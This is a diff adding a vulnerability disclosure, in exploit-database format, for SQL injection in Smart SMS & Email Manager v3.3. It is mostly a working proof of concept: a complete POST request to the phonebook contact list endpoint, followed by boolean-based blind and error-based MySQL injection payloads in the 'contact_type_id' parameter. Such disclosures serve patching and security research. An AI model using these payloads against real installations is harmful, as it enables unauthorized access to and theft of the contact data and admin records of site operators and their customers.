@@ -1,0 +1,52 @@
+# Exploit Title: Smart SMS & Email Manager v3.3 - SQL Injection
+# Google Dork: N/A
+# Date: 17.07.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/smart-sms-email-manager-ssem/14817919
+# Version: 3.3
+# Tested on: Kali linux
+====================================================
+The vulnerability allows an attacker to inject sql commands
+from the search section with 'contact_type_id' parameter in the admin panel.
+
+
+# PoC : SQLi :
+
+http://site.net/phonebook/contact_list_data
+
+POST /phonebook/contact_list_data HTTP/1.1
+Host: site.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://site.net/phonebook/contact_list
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 141
+Cookie:
+ci_session=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22d61b9083afe2435321ba518449f3b108%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22213.14.165.138%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A68%3A%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A52.0%29+Gecko%2F20100101+Firefox%2F52.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1531824069%3B%7Dce4c26e8ee366999ae805f61eba75b1a;
+xerone_dolphin=6811071531824070937
+Connection: keep-alive
+first_name=Test&last_name=test&phone_number=5555555&email=test%40test.com
+&dob=07%2F04%2F2018&contact_type_id=280&is_searched=1&page=1&rows=10
+
+
+Parameter: contact_type_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
+GROUP BY clause
+    Payload: client_username=tes&contact_type_id=142' RLIKE (SELECT (CASE
+WHEN (5715=5715) THEN 142 ELSE 0x28 END)) AND 'Jeop' LIKE
+'Jeop&permission_search=1&search_page=217722575636101&is_searched=1&page=1&rows=20
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (EXTRACTVALUE)
+    Payload: client_username=tes&contact_type_id=142' AND
+EXTRACTVALUE(4506,CONCAT(0x5c,0x7176716271,(SELECT
+(ELT(4506=4506,1))),0x7171707071)) AND 'vZFG' LIKE
+'vZFG&permission_search=1&search_page=217722575636101&is_searched=1&page=1&rows=20
+
+====================================================
